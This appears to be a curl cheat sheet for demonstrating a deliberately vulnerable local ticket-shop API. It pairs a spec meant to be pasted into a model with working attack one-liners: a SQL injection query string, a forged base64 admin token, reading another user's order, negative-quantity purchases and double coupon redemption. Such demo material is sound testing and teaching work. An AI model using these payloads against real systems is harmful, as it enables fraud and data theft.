# curl reference

The block between the markers is the text you paste into the model. Keep it
short; a 4-endpoint summary produces better cases than a 900-line OpenAPI dump.

<!-- PASTE-TO-MODEL START -->
```
ConfBadge API - internal ticket shop.
Attendees hold a prepaid credit balance, buy tickets from it, and earn 10% of
the ticket value back as credits. Maximum 10 tickets per order.

POST /auth/login     {"email": str, "password": str} -> {"access_token": str}
GET  /tickets?q=     search published tickets -> {count, results[{id,name,price,stock,audience}]}
POST /orders         {"ticket_id": int, "quantity": int, "coupon": str|null}
                     Authorization: Bearer <token>
                     -> 201 {order_id, total_charged, credits_earned, credit_balance}
GET  /orders/{id}    Authorization: Bearer <token> -> the order
GET  /me             Authorization: Bearer <token> -> {id, email, role, credits}

Coupons: EARLYBIRD = 20% off, unlimited. SPEAKER100 = 100% off, single use.
Seeded users: alice@corp.example / alice123, bob@corp.example / bob123.
A sample token looks like: MTp1c2Vy
```
<!-- PASTE-TO-MODEL END -->

---

## Normal use (this is what you show first)

```bash
# 1. browse
curl -s localhost:8000/tickets | jq

# 2. log in
TOKEN=$(curl -s -X POST localhost:8000/auth/login \
  -H 'content-type: application/json' \
  -d '{"email":"alice@corp.example","password":"alice123"}' | jq -r .access_token)

# 3. buy two general tickets
curl -s -X POST localhost:8000/orders \
  -H "authorization: Bearer $TOKEN" -H 'content-type: application/json' \
  -d '{"ticket_id":1,"quantity":2}' | jq
# {"total_charged": 4000.0, "credits_earned": 400.0, "credit_balance": 1400.0}
```

Everything above works. That is the trap.

## The one-liners worth having ready

```bash
# reset to a clean database between runs
curl -s -X POST localhost:8000/_reset

# B1  buy a negative quantity
curl -s -X POST localhost:8000/orders -H "authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' -d '{"ticket_id":1,"quantity":-5}' | jq

# B3  leak the unpublished internal ticket
curl -s -G localhost:8000/tickets --data-urlencode "q=%' OR published = 0 OR name LIKE '%" | jq

# B7  forge an admin token - we never asked the server for this
FORGED=$(python3 -c "import base64;print(base64.urlsafe_b64encode(b'9:admin').decode())")
curl -s localhost:8000/me -H "authorization: Bearer $FORGED" | jq

# B4  read someone else's order
BOB=$(curl -s -X POST localhost:8000/auth/login -H 'content-type: application/json' \
  -d '{"email":"bob@corp.example","password":"bob123"}' | jq -r .access_token)
curl -s localhost:8000/orders/1 -H "authorization: Bearer $BOB" | jq

# B5  redeem the single-use coupon, twice
for i in 1 2; do curl -s -X POST localhost:8000/orders -H "authorization: Bearer $TOKEN" \
  -H 'content-type: application/json' \
  -d '{"ticket_id":1,"quantity":1,"coupon":"SPEAKER100"}' | jq -c; done
```

If `jq` is not installed, drop it and pipe to `python3 -m json.tool`.
Test that today.
